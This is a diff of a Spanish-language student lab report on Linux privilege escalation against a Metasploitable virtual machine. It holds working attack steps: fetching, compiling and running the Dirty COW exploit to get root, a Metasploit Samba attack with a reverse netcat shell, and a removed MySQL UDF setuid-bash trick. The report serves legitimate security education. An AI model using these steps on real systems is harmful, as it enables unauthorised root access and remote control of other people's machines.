@@ -166,89 +166,59 @@ El segundo método a probar es la explotación del Kernel debido a que Kernels a
 
 #### **Paso 1: Identificar Versión del Kernel**
 
-uname -a
+Se ejecutaron los comandos `uname -a`, `cat /etc/issue`, `cat /proc/version` y `uname -a > /tmp/equipo4\_privesc/kernel\_info.txt` ya que son herramientas escenciales en el proceso de information gathering(recopilación de información) del objetivo del ataque, estos comandos permiten obtener información sobre la versión y distribución del sistema operativo.
 
-cat /etc/issue
+A continuacuión se presenta una tabla con los comandos utilizados para mostrar su estcuvutra y su utilidad en esta fase de recopilación de información del objetivo.
 
-cat /proc/version
-
-\# Guardar información
-
-uname -a > /tmp/equipo4\_privesc/kernel\_info.txt
+| Comando | Función Principal | Información Específica Recopilada |
+| :--- | :--- | :--- |
+| **`uname -a`** | Muestra toda la información sobre el sistema. | **Versión del Kernel**, Arquitectura, Nombre de host. |
+| **`cat /etc/issue`** | Muestra el contenido del archivo de emisión. | **Distribución de Linux** (ej. Ubuntu, Debian) y su versión. |
+| **`cat /proc/version`** | Muestra la información del kernel en tiempo real. | **Versión detallada del Kernel**, compilador GCC. |
+| **`uname -a > /tmp/equipo4_privesc/kernel_info.txt`** | Redirecciona la salida de `uname -a`. | Guarda la información del kernel en un archivo en el directorio `/tmp`. |
 
 **Paso 2: Buscar Exploits Conocidos**
 
-\# Desde Kali (otra terminal)
+Se ejecutaron los comandos `searchsploit linux kernel 2.6 privilege escalation`, `searchsploit linux kernel 2.6.24` y `searchsploit dirty cow` para poder buscar exploits conocidos con el fin de ser usados para realizar una escalada de privilegios en el sistema del objetivo.
 
-searchsploit linux kernel 2.6 privilege escalation
+La herramienta de linea de comandos `searchsploit` es una que viene incluida en varias distribuciones de seguridad como Kali Linux, la usada por la maquina "analista". Esta herramienta es en escencia una interfaz de lineas de comandos(CLI) para la base de datos Exploit-DB, esta almacena información sobre diferentes exploits y vulnerabilidades.
 
-searchsploit linux kernel 2.6.24
+Es importante mencionar que Exploit-DB es mantenida y desarrollada por **OffSec(Offensive Security)**, una organización líder en el campo de la ciberseguridad y el hacking ético, de igual forma esta misma organización está detrás de la distribución usada por "analista" la cual es Kali Linux.
 
-\# Ejemplo: Dirty COW (CVE-2016-5195) - funciona en muchos kernels
+A continuación se presenta una tabla con los comandos previamente mencionados donde se explica su propisto y funcionmiento dentro del contexto de la seguridad del sistema.
 
-searchsploit dirty cow
+| Comando | Propósito | Contexto de Seguridad |
+| :--- | :--- | :--- |
+| **`searchsploit linux kernel 2.6 privilege escalation`** | Busca **exploits generales** de escalada de privilegios que funcionen en cualquier versión del **Kernel 2.6.x** de Linux. | Se utiliza para encontrar exploits antiguos y conocidos en kernels desactualizados. |
+| **`searchsploit linux kernel 2.6.24`** | Realiza una búsqueda **específica** de exploits dirigidos a la versión exacta: **Kernel 2.6.24**. | Mayor probabilidad de encontrar un exploit funcional al coincidir con la versión exacta identificada previamente (ej., con `uname -a`). |
+| **`searchsploit dirty cow`** | Busca exploits relacionados con la vulnerabilidad **Dirty COW (CVE-2016-5195)**. | Es un exploit de **alta relevancia** que funcionó en un amplio rango de kernels y se usa a menudo como prueba de concepto para sistemas vulnerables. |
 
 **Paso 3: Usar Exploit Pre-compilado (Ejemplo: Dirty COW)**
 
-\# En Kali, descargar exploit
+Se ejecutó el comando `searchsploit -m 40839` para mostrar, copiar y extraer el codigo fuente del exploit con ID 40839, esto se logro mediante la opcion `-m`(Mirroing) ya que está le indica a la herramienta que no solo busque el exploit sino que también haga una copia desde la base de datos local hacia el directorio actual donde se ejecutó el comando.
 
-searchsploit -m 40839
+En este caso, el exploit a utilizar es uno correspondiente a una escalada de privilegios de Linux conocido como "Dirty COW" (CVE-2016-5195).
 
-\# O descargar manualmente
+Para transferir el exploit a la máquina objetivo se decidió levantar un servidor HTTP mediante el comando `python3 -m http.server 8000`en la máquina atacante, la máquina "analista", para hacerla un servidor de archivos temporal ya que con esto se tiene un medio de entrega del exploit al objetivo al tener abierta en el atacante una terminal del objetivo mediante SSH, acción realizada por el equipo 2 en su parte del ataqye.
 
-cd /tmp
-
-wget https://www.exploit-db.com/download/40839 -O dirtycow.c
-
-\# Transferir a Metasploitable
-
-\# Opción A: Levantar servidor web en Kali
-
-python3 -m http.server 8000
-
-\# En Metasploitable, descargar
-
-cd /tmp/equipo4\_privesc
-
-wget http://192.168.100.9:8000/40839.c
-
-\# Opción B: Usar SCP
-
-\# En Kali:
-
-scp dirtycow.c msfadmin@<IP\_METASPLOITABLE>:/tmp/equipo4\_privesc/
+Por ello, en la terminal SSH se ejecutan los comandos `cd /tmp/equipo4\_privesc` y `wget http://192.168.100.9:8000/40839.c`para primero moverse al directorio tmp ya que es uno universalmente **accesible** y **escribible** por casi cualquier usuario en sistemas Linux, por lo que es ideal para descargar archivos temporales sin preocuparse por los permisos iniciales y luego descargar el archivo del exploit en el directorio actual para luego ser compilado y ejecutado.
 
 **Paso 4: Compilar y Ejecutar Exploit**
 
-\# En Metasploitable
+Se compiló el archivo del exploit previamente descargado mediante el comando `gcc -pthread 40839.c -o 40839 -lcrypt` lo que dió como resultado un archivo binario ejecutable con el nombre "40839", se usaron las opciones -pthread y -lcrypt ya que Dirty COW necesita de estas librerias para funcionar correctamente.
 
-cd /tmp/equipo4\_privesc
+Luego se ejecutó el archivo binario mediante el comando `./40839` y se siguieron las instrucciones del mismo para crear un usuario con los privilegios con el objetivo de lograr la escalada de privilegios.
 
-\# Compilar
+Para comprobar que se logró la escalada se ejecutaron los comandos `su firefart`, `whoami` y `id`, solo se explicará el funcionamiento del primer comando ya que los otros dos fueron explicados en la técnica 1.
 
-gcc -pthread dirtycow.c -o dirtycow -lcrypt
-
-\# Ejecutar (CUIDADO: puede desestabilizar el sistema)
-
-./dirtycow
-
-\# Seguir instrucciones del exploit
-
-\# Generalmente crea un nuevo usuario con UID 0
-
-\# Verificar
-
-su firefart  # O el usuario que creó el exploit
-
-\# Password: (la que configuraste)
-
-whoami  # Debería ser root
-
-id
-
-\# Crear evidencia
-
-echo "Root via Dirty COW - Equipo 4" > /root/equipo4\_dirtycow\_root.txt
+El comando `su firefart` sirve para cambiar el usuario de la sesión actual al usuario **firefart**, que fue creado por el exploit, para luego ejecutar los dos comandos siguientes para comprobar que tiene privilegios de root. Los comandos `whoami` y `id` tuvieron la siguiente salida:
+```sh
+firefart@metasploitable:/tmp/equipo4_privesc# whoami
+firefart
+firefart@metasploitable:/tmp/equipo4_privesc# id
+uid=0(firefart) gid=0(root) groups=0(root)
+```
+Cabe destacar que previamente se ejecutó`su firefart` para hacer el cambio de usuario, por último se ejecutó el comando `echo "Root via Dirty COW - Equipo 4" > /root/equipo4\_dirtycow\_root.txt` para dejar la evidencia de la escalada como se hizo en la técnica anterior.
 
 **NOTA IMPORTANTE**: Dirty COW puede ser destructivo. En un entorno de producción, usa con extrema precaución. Para esta práctica, asegúrate de tener snapshots de tus VMs.
 
@@ -351,37 +321,9 @@ whoami  # root
 -----
 **
 
-**🎯 TÉCNICA 5: Explotación de Servicios Vulnerables**
+### 🎯 TÉCNICA 5: Explotación de Servicios Vulnerables**
 
-**MySQL UDF (User Defined Function) Exploit**
-
-\# Conectar a MySQL como root (sin contraseña en Metasploitable)
-
-mysql -u root
-
-\# Dentro de MySQL
-
-mysql> use mysql;
-
-mysql> create table foo(line blob);
-
-mysql> insert into foo values(load\_file('/tmp/raptor\_udf2.so'));
-
-mysql> select \* from foo into dumpfile '/usr/lib/raptor\_udf2.so';
-
-mysql> create function do\_system returns integer soname 'raptor\_udf2.so';
-
-mysql> select do\_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
-
-mysql> \q
-
-\# Ejecutar bash con privilegios
-
-/tmp/rootbash -p
-
-whoami  # root
-
-**NOTA**: Necesitas el archivo raptor\_udf2.so. Puedes compilarlo o descargarlo.
+No se pudo realizar esta técnica ya que no se contaba con el archivo `raptor\_udf2.so.` y por motivos de tiempo en la realización de la práctica se decidió continuar con la siguiente técnica a probar.
 
 -----
 **🎯 TÉCNICA 6: Path Hijacking**
@@ -433,11 +375,11 @@ msfconsole
 
 msf6 > use exploit/multi/samba/usermap\_script
 
-msf6 exploit > set RHOSTS <IP\_METASPLOITABLE>
+msf6 exploit > set RHOSTS <192.168.100.20>
 
 msf6 exploit > set payload cmd/unix/reverse\_netcat
 
-msf6 exploit > set LHOST <IP\_KALI>
+msf6 exploit > set LHOST <192.168.100.9>
 
 msf6 exploit > exploit
 
